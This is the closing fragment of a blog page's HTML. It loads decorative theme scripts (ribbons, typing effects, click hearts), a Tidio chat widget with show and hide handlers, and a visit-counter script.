window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><script src="//code.tidio.co/eucyopvw8zt034ovoshroc4kci4qpweh.js" async="async"></script><script>function onTidioChatApiReady() {
  window.tidioChatApi.hide();
  window.tidioChatApi.on("close", function() {
    window.tidioChatApi.hide();
  });
}
if (window.tidioChatApi) {
  window.tidioChatApi.on("ready", onTidioChatApiReady);
} else {
  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
}

var chatBtnFn = () => {
  document.getElementById("chat_btn").addEventListener("click", function(){
    window.tidioChatApi.show();
    window.tidioChatApi.open();
  });
}
chatBtnFn()
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>